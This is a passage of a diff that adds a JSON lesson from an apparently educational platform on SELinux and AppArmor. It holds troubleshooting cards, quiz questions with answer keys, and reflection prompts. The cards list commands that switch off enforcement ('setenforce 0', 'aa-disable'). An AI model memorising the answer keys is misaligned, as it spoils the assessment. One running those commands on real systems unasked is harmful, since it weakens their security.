             │\n│   setenforce 0                                       │\n└──────────────────────────────────────────────────────┘\n\n┌──────────────────────────────────────────────────────┐\n│           AppArmor TROUBLESHOOTING CARD              │\n├──────────────────────────────────────────────────────┤\n│ CHECK STATUS:                                        │\n│   aa-status                                          │\n│                                                      │\n│ CHECK DENIALS:                                       │\n│   grep apparmor.*DENIED /var/log/syslog            │\n│                                                      │\n│ SET COMPLAIN MODE:                                   │\n│   aa-complain /usr/bin/program                      │\n│                                                      │\n│ SET ENFORCE MODE:                                    │\n│   aa-enforce /usr/bin/program                       │\n│                                                      │\n│ RELOAD PROFILE:                                      │\n│   apparmor_parser -r /etc/apparmor.d/profile        │\n│                                                      │\n│ AUTO-GENERATE PROFILE:                               │\n│   aa-genprof /usr/bin/program                       │\n│                                                      │\n│ DISABLE PROFILE:                                     │\n│   aa-disable /usr/bin/program                       │\n└──────────────────────────────────────────────────────┘\n```"
+      }
+    },
+    {
+      "type": "quiz",
+      "content": {
+        "questions": [
+          {
+            "question_id": "q1",
+            "type": "multiple_choice",
+            "question": "What is the fundamental difference between DAC and MAC?",
+            "options": [
+              "DAC is faster than MAC",
+              "DAC allows file owners to control access, MAC enforces system-wide policy that cannot be overridden",
+              "MAC requires more disk space than DAC",
+              "DAC works on files, MAC works on processes"
+            ],
+            "correct_answer": 1,
+            "explanation": "Option B: DAC (Discretionary Access Control) lets file owners decide permissions (chmod/chown). MAC (Mandatory Access Control) enforces system-level policies that even root cannot override. Both apply to files AND processes. Performance and disk space are not defining factors.",
+            "difficulty": 2,
+            "memory_aid": "DAC = owner Decides, MAC = system Mandates",
+            "points": 10
+          },
+          {
+            "question_id": "q2",
+            "type": "multiple_choice",
+            "question": "In the SELinux context 'system_u:system_r:httpd_t:s0', which field is MOST important for troubleshooting?",
+            "options": [
+              "system_u (user)",
+              "system_r (role)",
+              "httpd_t (type)",
+              "s0 (level)"
+            ],
+            "correct_answer": 2,
+            "explanation": "Option C: The TYPE field (httpd_t) defines what the process IS and determines access rules. Type Enforcement is the core of SELinux. User/role/level are less critical for typical troubleshooting. 'httpd_t' means 'this is an Apache process', which dictates what it can access.",
+            "difficulty": 2,
+            "memory_aid": "TYPE is the TARGET for Troubleshooting (alliteration!)",
+            "points": 10
+          },
+          {
+            "question_id": "q3",
+            "type": "multiple_choice",
+            "question": "You copy a file to /var/www/html/ and Apache returns 403 Forbidden. DAC permissions are correct (644). What's the likely SELinux issue?",
+            "options": [
+              "SELinux is disabled",
+              "File has wrong security context (type)",
+              "Apache service is not in enforcing mode",
+              "The file is too large"
+            ],
+            "correct_answer": 1,
+            "explanation": "Option B: Copied files inherit source context, not destination. File likely has 'admin_home_t' or 'user_home_t' instead of 'httpd_sys_content_t'. Solution: 'restorecon -v /var/www/html/file'. Check with 'ls -Z'. SELinux being disabled (A) would ALLOW access. File size (D) is irrelevant.",
+            "difficulty": 2,
+            "memory_aid": "Copied files = Wrong context = restorecon fixes it",
+            "points": 10
+          },
+          {
+            "question_id": "q4",
+            "type": "multiple_choice",
+            "question": "What's the difference between 'chcon' and 'semanage fcontext + restorecon'?",
+            "options": [
+              "chcon is permanent, semanage is temporary",
+              "chcon is temporary (lost on relabel), semanage+restorecon is permanent",
+              "chcon works on files, semanage works on processes",
+              "They are identical commands"
+            ],
+            "correct_answer": 1,
+            "explanation": "Option B: 'chcon' changes context temporarily—it's lost when you run 'restorecon' or relabel filesystem. 'semanage fcontext' adds rule to policy database, then 'restorecon' applies it. The policy rule persists across relabels. Both work on files. Use semanage for permanent changes.",
+            "difficulty": 3,
+            "memory_aid": "CHcon = CHeap (temporary), semanage = Solid (permanent in policy)",
+            "points": 15
+          },
+          {
+            "question_id": "q5",
+            "type": "multiple_choice",
+            "question": "Your PHP app can't connect to a remote database. SELinux is enforcing. What's the fix?",
+            "options": [
+              "setenforce 0",
+              "chmod 777 on database files",
+              "setsebool -P httpd_can_network_connect_db on",
+              "Disable SELinux permanently"
+            ],
+            "correct_answer": 2,
+            "explanation": "Option C: The boolean 'httpd_can_network_connect_db' allows Apache to make network connections to databases. Option A (permissive mode) and D (disable) sacrifice security. Option B (chmod) is irrelevant—database is on another server. Always try booleans before disabling SELinux!",
+            "difficulty": 2,
+            "memory_aid": "Read boolean name as sentence: 'httpd CAN network connect db'",
+            "points": 10
+          },
+          {
+            "question_id": "q6",
+            "type": "multiple_choice",
+            "question": "Which command shows recent SELinux denials with human-readable suggestions?",
+            "options": [
+              "ausearch -m AVC -ts recent",
+              "sealert -a /var/log/audit/audit.log",
+              "semanage -l",
+              "sestatus"
+            ],
+            "correct_answer": 1,
+            "explanation": "Option B: 'sealert' analyzes audit.log and provides human-friendly explanations plus suggested fixes. 'ausearch' (A) shows raw denials (useful but less friendly). 'semanage -l' (C) lists policy rules. 'sestatus' (D) shows SELinux status.",
+            "difficulty": 2,
+            "memory_aid": "sealert = SELinux ALERT with suggestions",
+            "points": 10
+          },
+          {
+            "question_id": "q7",
+            "type": "multiple_choice",
+            "question": "What's the main advantage of AppArmor over SELinux?",
+            "options": [
+              "AppArmor is more secure",
+              "AppArmor is easier to learn and uses path-based policies",
+              "AppArmor has better performance",
+              "AppArmor works on more distributions"
+            ],
+            "correct_answer": 1,
+            "explanation": "Option B: AppArmor uses paths (easier to understand) vs. SELinux contexts (label-based, more complex). Security levels are comparable. Performance is similar. Both are widely available, but on different default distros (Ubuntu=AppArmor, RHEL=SELinux).",
+            "difficulty": 2,
+            "memory_aid": "AppArmor = Approachable (paths), SELinux = Sophisticated (labels)",
+            "points": 10
+          },
+          {
+            "question_id": "q8",
+            "type": "multiple_choice",
+            "question": "In an AppArmor profile, what does '/var/www/**  r,' mean?",
+            "options": [
+              "Read access to /var/www/ only, not subdirectories",
+              "Read access to /var/www/ and all subdirectories recursively",
+              "Write access to /var/www/ only",
+              "Execute access to files in /var/www/"
+            ],
+            "correct_answer": 1,
+            "explanation": "Option B: '**' means recursive (all subdirectories), '*' means single level. 'r' means read permission. So '/var/www/** r,' allows reading all files under /var/www/ at any depth. This is common for web servers serving static content.",
+            "difficulty": 2,
+            "memory_aid": "* = one level, ** = recursive (two stars = deeper)",
+            "points": 10
+          }
+        ]
+      }
+    },
+    {
+      "type": "reflection",
+      "content": {
+        "text": "## Reflection Questions\n\n### Understanding Check\n\n1. **Explain in your own words why MAC systems like SELinux can prevent exploits even when there's a kernel vulnerability.**\n\n   *Hint*: Think about defense in depth and the Dirty COW case study.\n\n2. **You're deploying a new web application. Walk through the decision process: Should you use SELinux or AppArmor? What factors matter?**\n\n   *Consider*: OS, team expertise, security requirements, time constraints.\n\n3. **Describe the investigation steps when an application breaks after enabling SELinux. What's your mental checklist?**\n\n   *Hint*: Think about the \"three-step fix\" process.\n\n4. **Why is it important that MAC policies cannot be overridden by root? Give a real-world scenario where this matters.**\n\n   *Consider*: Compromised admin accounts, insider threats, malware with root.\n\n### Practical Application\n\n5. **You find this in audit.log: 'scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0'. What's wrong and how do you fix it?**\n\n   *Hint*: Focus on the TYPE fields.\n\n6. **Your company policy: 'Never disable SELinux.' But a vendor's install script requires 'setenforce 0'. How do you satisfy both requirements?**\n\n   *Consider*: Alternative approaches, policy customization, vendor communication.\n\n7. **Design a MAC policy for a Python script that should only: read /data/input/, write /data/output/, and connect to MySQL on port 3306. Choose either SELinux or AppArmor and explain your choice.**\n\n   *Consider*: Policy syntax, ease of maintenance, team capabilities.\n\n### Critical Thinking\n\n8. **Some sysadmins disable SELinux immediately. What might motivate this decision? Is it ever justified?**\n\n   *Consider*: Time pressure, knowledge gaps, application compatibility, risk assessment.\n\n9. **MAC systems add complexity. At what scale or security sensitivity level do you think MAC becomes worth the overhead?**\n\n   *Consider*: Small startups vs. banks vs. government, cost/benefit analysis.\n\n10. **Research: Can an attacker with root access disable or bypass SELinux? What protections exist? What about AppArmor?**\n\n   *Hint*: Look into 'secure boot', the '-e 2' flag, and immutable mode."
+      }
+    }
+  ],
+  "post_assessment": [
+    {
+      "question_id": "pa1",
+      "type": "multiple_choice",
+      "question": "A security audit finds SELinux is in permissive mode on production servers. What's the risk?",
+      "options": [
+        "No risk—permissive mode still logs violations",
+        "High risk—policies are not enforced, denials are logged but allowed",
+        "Medium risk—some policies are enforced, others are not",
+        "No risk—permissive mode is recommended for production"
+      ],
+      "correct_answer": 1,
+      "explanation": "Option B: Permissive mode means violations are LOGGED but NOT BLOCKED. It's equivalent to having SELinux disabled from a security standpoint—attackers can do anything. Only use permissive for debugging, never production. Enforcing mode is required for actual protection.",
+      "difficulty": 3,
+      "memory_aid": "Permissive = Permits violations (only logs, doesn't block)",
+      "points": 15
+    },
+    {
+      "question_id": "pa2",
+      "type": "multiple_choice",
+      "question": "You're hardening a server. The vendor says their app requires 'setenforce 0'. What's the BEST approach?",
+      "options": [
+        "Disable SELinux as vendor recommends",
+        "Run app in permissive mode, investigate denials, create custom policy or use booleans",
+        "Ignore vendor recommendation, keep enforcing mode",
+        "Switch to AppArmor instead"
+      ],
+      "correct_answer": 1,
+      "explanation": "Option B: Best practice is: (1) Temporarily use permissive, (2) Run app, (3) Check 'ausearch -m AVC', (4) Fix with booleans/policy. Often vendor says 'disable SELinux' because they didn't test properly—many times a simple boolean fixes it. Disabling (A) sacrifices security. Ignoring (C) breaks the app. Switching (D) doesn't solve the problem.",
+      "difficulty": 3,
+      "memory_aid": "Vendor says disable = Investigate first, often fixable with booleans",
+      "points": 15
+    }
+  ],
+  "tags": [
+    "linux",
+    "selinux",
+    "apparmor",
+    "mandatory_access_control",
+    "security_policies",
+    "system_hardening",
+    "MAC",
+    "security_contexts"
+  ],
+  "version": "1.0",
+  "author": "CyberLearn Platform",
+  "created_at": "2025-01-28T12:00:00Z",
+  "updated_at": "2025-01-28T12:00:00Z"
+}
